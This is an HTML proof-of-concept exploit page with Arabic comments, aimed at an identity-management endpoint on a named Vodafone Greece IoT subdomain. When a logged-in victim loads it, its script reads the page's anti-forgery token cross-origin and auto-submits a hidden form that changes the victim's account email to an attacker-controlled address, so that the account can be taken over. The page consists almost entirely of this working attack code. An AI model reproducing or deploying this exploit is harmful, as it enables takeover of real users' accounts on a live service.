<!DOCTYPE html>
<html>
<head>
    <title>Critical Security PoC</title>
</head>
<body>
    <div id="msg" style="font-family: sans-serif; padding: 20px;">
        <h2>Exploiting...</h2>
        <p id="status">Step 1: Sniffing Token via CORS (GET)...</p>
    </div>

    <script>
        const target = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";

        async function launchAttack() {
            try {
                // 1. سحب التوكن (الـ GET مسموح وما ببعث OPTIONS Preflight)
                const response = await fetch(target, { method: 'GET', credentials: 'include' });
                const html = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;

                if (!token) {
                    document.getElementById('status').innerText = "❌ Error: Token not captured. Are you logged in?";
                    return;
                }

                document.getElementById('status').innerText = "Step 2: Token Captured! Bypassing OPTIONS via Form Submit...";

                // 2. استخدام الفورم يدوياً (لأنه Simple Request ولا يخضع للـ Preflight)
                const form = document.createElement('form');
                form.method = "POST";
                form.action = target;

                // البيانات المطلوبة لتغيير الإيميل
                const newEmail = `hacked_${Math.random().toString(36).substring(7)}@vodafone-poc.io`;
                const payload = {
                    "IsEmailConfirmed": "True",
                    "Email": newEmail,
                    "PhoneNumber": "",
                    "Name": "Xia0Checkmate",
                    "Website": "",
                    "Profile": "",
                    "StreetAddress": "",
                    "Locality": "12",
                    "Region": "",
                    "PostalCode": "",
                    "Country": "",
                    "__RequestVerificationToken": token // التوكن المسروق
                };

                for (const key in payload) {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = key;
                    input.value = payload[key];
                    form.appendChild(input);
                }

                document.body.appendChild(form);
                
                // التنفيذ الفوري
                setTimeout(() => {
                    form.submit();
                }, 1000);

            } catch (err) {
                document.getElementById('status').innerText = "❌ Critical Error: " + err.message;
            }
        }

        window.onload = launchAttack;
    </script>
</body>
</html>
